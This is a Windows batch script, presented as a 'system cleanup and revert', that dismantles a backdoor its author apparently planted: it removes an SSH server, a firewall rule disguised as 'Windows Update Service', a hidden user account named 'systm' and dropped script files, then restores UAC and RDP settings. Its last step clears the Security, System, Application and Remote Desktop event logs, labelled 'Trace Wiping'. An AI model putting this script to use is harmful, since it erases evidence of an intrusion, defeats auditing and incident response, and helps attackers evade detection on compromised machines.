@echo off
title System Cleanup and Revert Process
echo Revert process initiated, please wait...

:: ---------------------------------------------------------
:: STEP 1: Stop Services and Remove OpenSSH
:: ---------------------------------------------------------
echo [1/6] Stopping and removing SSH Service...
net stop sshd >nul 2>&1
sc config sshd start= disabled >nul 2>&1

:: Remove OpenSSH feature completely
dism /Online /Remove-Capability /CapabilityName:OpenSSH.Server~~~~0.0.1.0 /Quiet /NoRestart

:: Reset BITS service to manual
sc config bits start= demand >nul 2>&1

:: ---------------------------------------------------------
:: STEP 2: Revert Firewall and UAC Settings
:: ---------------------------------------------------------
echo [2/6] Restoring Firewall rules and UAC settings...

:: Delete the fake 'Windows Update Service' rule we created for Port 22
netsh advfirewall firewall delete rule name="Windows Update Service" >nul 2>&1

:: Turn Firewall back ON (Global setting)
netsh advfirewall set currentprofile state on

:: Re-enable UAC (User Account Control) - Requires Reboot to take effect
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f >nul 2>&1

:: ---------------------------------------------------------
:: STEP 3: Revert RDP Settings
:: ---------------------------------------------------------
echo [3/6] Restoring RDP security settings...

:: Disable RDP Connections (Default secure state)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f >nul 2>&1

:: Re-enable NLA (Network Level Authentication) for RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f >nul 2>&1

:: ---------------------------------------------------------
:: STEP 4: Delete Hidden User
:: ---------------------------------------------------------
echo [4/6] Deleting 'systm' user and registry entries...

:: Delete user from system
net user systm /delete >nul 2>&1

:: Delete Registry key used for hiding the user
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v systm /f >nul 2>&1

:: ---------------------------------------------------------
:: STEP 5: Clean Temporary Files
:: ---------------------------------------------------------
echo [5/6] Cleaning temporary files...
:: Remove downloaded files or script artifacts if any exist
if exist "%TEMP%\sys_upd.bat" del "%TEMP%\sys_upd.bat" /f /q >nul 2>&1
if exist "%TEMP%\launcher.vbs" del "%TEMP%\launcher.vbs" /f /q >nul 2>&1

:: ---------------------------------------------------------
:: STEP 6: Clear Event Logs
:: ---------------------------------------------------------
echo [6/6] Clearing Windows Event Logs (Trace Wiping)...

:: Clear Security, System, and Application logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
wevtutil cl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational"

echo.
echo ==========================================
echo      SYSTEM RESTORED TO ORIGINAL STATE
echo      (Please reboot to apply UAC changes)
echo ==========================================
pause
